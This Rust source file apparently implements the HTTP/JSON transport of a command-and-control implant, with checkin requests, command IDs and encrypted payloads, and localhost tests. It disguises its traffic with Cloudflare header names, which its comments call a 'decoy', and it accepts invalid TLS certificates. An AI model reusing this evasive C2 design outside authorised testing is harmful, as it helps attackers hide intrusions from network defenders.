use anyhow::Result;
use bytes::{Buf, Bytes};
use reqwest::{Client, ClientBuilder};
use serde::de::DeserializeOwned;
use serde::Serialize;

use rs2_communication_protocol::metadata::{Metadata, WithMetadata};
use rs2_communication_protocol::protocol::Protocol;
use rs2_communication_protocol::sender::Sender;
use rs2_crypt::encryption_algorithm::EncryptionAlgorithm;

/// Define the JSON protocol for sending and receiving data.
pub struct JsonProtocol<E>
	where E: EncryptionAlgorithm {
	/// The HTTP client used to send requests. This is an instance of the reqwest crate.
	/// It is configured to accept invalid certificates, use a maximum of 2 idle connections per host,
	/// and have a timeout of 30 seconds.
	/// It's also forced to uses the rustls TLS backend.
	///
	/// Initiating a client allows for the creation of keep-alive connections, which can be reused
	/// for multiple requests, reducing the overhead of establishing a new connection for each
	/// request and improving performance.
	client: Client,
	/// A flag indicating whether the protocol is used for checkin.
	/// This is used to determine whether the checkin endpoint should be appended to the URL.
	/// It's automatically reset to false after each request.
	is_checkin: bool,
	/// The base URL for the protocol. This is the URL to which requests are sent.
	base_url: String,
	/// The global encryptor used to encrypt and decrypt data.
	/// This is used only if an encryptor is not provided when sending or receiving data.
	/// If no encryptor is provided, the global encryptor is used to encrypt and decrypt data as fallback;
	/// if the global encryptor is not set, data is sent and received without encryption.
	global_encryptor: Option<E>,
}

unsafe impl<E> Send for JsonProtocol<E>
	where E: EncryptionAlgorithm {}

impl<E> JsonProtocol<E>
	where E: EncryptionAlgorithm {
	/// Create a new JSON protocol.
	pub fn new(base_url: String) -> Self {
		JsonProtocol {
			client: ClientBuilder::new()
				.danger_accept_invalid_certs(true)
				.pool_max_idle_per_host(2)
				.timeout(std::time::Duration::from_secs(30))
				.use_rustls_tls()
				.build()
				.unwrap(),
			is_checkin: false,
			base_url,
			global_encryptor: None,
		}
	}

	/// Set the global encryptor used to encrypt and decrypt data.
	pub fn set_global_encryptor(&mut self, encryptor: Option<E>) -> &Self {
		self.global_encryptor = encryptor;

		self
	}

	/// Get the encryptor to use for encryption or decryption, falling back to the global encryptor
	/// if necessary.
	fn encryptor_or_global(&self, encryptor: Option<E>) -> Option<E> {
		encryptor.or(
			if let Some(encryptor) = self.global_encryptor.clone() {
				Some(encryptor)
			} else {
				None
			}
		)
	}
}

impl<E> Sender for JsonProtocol<E>
	where E: EncryptionAlgorithm {
	fn set_is_checkin(&mut self, is_checkin: bool) -> &Self {
		self.is_checkin = is_checkin;

		self
	}

	async fn send(&mut self, data: Bytes, metadata: Metadata) -> Result<Bytes> {
		let mut url = self.base_url.clone();

		// Ensure the URL ends with a slash.
		if !url.ends_with('/') {
			url.push('/');
		}

		// Append the checkin endpoint to the URL if necessary
		if self.is_checkin {
			url.push_str("checkin/");
		}

		// Append the path to the URL if it is provided.
		if let Some(ref path) = metadata.path {
			url.push_str(&path);
		}

		// Reset the checkin flag after each request, here the request has not been sent yet but
		// the flag is reset to avoid it being set for the next request in case of errors.
		self.set_is_checkin(false);

		let response = self.client.post(&url)
		                   .body(data.to_vec())
		                   .header("Content-Type", "text/plain")
			// Add the request ID to the headers. Borrowed the cloudflare header name for decoy.
			               .header("CF-Ray", metadata.request_id.to_string())
			// Add the command ID to the headers. Borrowed the cloudflare header name for decoy.
			               .header("CF-Worker", metadata.command_id.to_string())
		                   .send()
		                   .await?;

		Ok(response.bytes().await?)
	}
}

impl<E> Protocol<E> for JsonProtocol<E>
	where E: EncryptionAlgorithm + Send {
	fn read<S>(&self, data: Bytes, encryptor: Option<E>) -> Result<S>
		where S: DeserializeOwned {
		// Use the global encryptor if an encryptor is not provided.
		let encryptor = self.encryptor_or_global(encryptor);

		// Decrypt the data if an encryptor is provided.
		let data = if let Some(encryptor) = encryptor {
			encryptor.decrypt(Bytes::from(data))?
		} else {
			data
		};

		serde_json::from_slice(data.iter().as_slice()).map_err(|e| e.into())
	}

	async fn write<D>(&mut self, data: D, encryptor: Option<E>) -> Result<Bytes>
		where D: Serialize + WithMetadata + Send {
		let metadata = data.get_metadata();
		let data = Bytes::from(serde_json::to_vec(&data)?);

		let data = {
			// Use the global encryptor if an encryptor is not provided.
			let mut encryptor = self.encryptor_or_global(encryptor);

			// Encrypt the data if an encryptor is provided.
			let data = if let Some(mut encryptor) = encryptor.as_mut() {
				encryptor.encrypt(data)?
			} else {
				data
			};

			data
		};

		self.send(data, metadata).await
	}
}

#[cfg(test)]
mod tests {
	use axum::http::HeaderMap;
	use axum::Router;
	use axum::routing::get;
	use serde::Deserialize;
	use tokio::select;
	use tokio_util::sync::CancellationToken;
	use uuid::uuid;

	use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;

	use super::*;

	async fn make_dummy_server(cancellation_token: CancellationToken, router: Router<()>) {
		let listener = tokio::net::TcpListener::bind("127.0.0.1:8080").await.unwrap();

		axum::serve(listener, router)
			.with_graceful_shutdown(async move {
				select! {
					_ = cancellation_token.cancelled() => {},
				}
			})
			.await
			.unwrap();
	}

	#[derive(Serialize, Deserialize, Debug)]
	struct SampleData {
		foo: String,
	}

	impl WithMetadata for SampleData {
		fn get_metadata(&self) -> Metadata {
			Metadata {
				request_id: uuid!("00000000-0000-0000-0000-000000000000"),
				command_id: uuid!("00000000-0000-0000-0000-000000000000"),
				path: None,
			}
		}
	}

	#[test]
	fn test_read() {
		let encryptor = IdentEncryptor;
		let protocol = JsonProtocol::new("http://localhost:8080".to_string());
		let data = Bytes::from("{\"foo\":\"bar\"}");
		let result = protocol.read::<SampleData>(data, Some(encryptor));
		assert!(result.is_ok());
		let value = result.unwrap();
		assert_eq!(value.foo, "bar");
	}

	#[tokio::test]
	async fn test_write() {
		let cancellation_token = CancellationToken::new();
		let handler = |headers: HeaderMap, body: Bytes| async move {
			assert_eq!(headers.get("content-type").unwrap(), "text/plain");
			assert_eq!(headers.get("cf-ray").unwrap(), "00000000-0000-0000-0000-000000000000");
			assert_eq!(headers.get("cf-worker").unwrap(), "00000000-0000-0000-0000-000000000000");
			assert_eq!(body, Bytes::from("{\"foo\":\"bar\"}"));
			"Ok"
		};
		let router = Router::new()
			.route("/", get(handler).post(handler));

		let call = make_dummy_server(cancellation_token.clone(), router);
		let server_handle = tokio::spawn(async move {
			call.await;
		});

		let encryptor = IdentEncryptor;
		let mut protocol = JsonProtocol::new("http://localhost:8080".to_string());
		let data = SampleData { foo: "bar".to_string() };

		let _result = protocol.write(data, Some(encryptor)).await;

		cancellation_token.cancel();
		server_handle.await.unwrap();
	}
}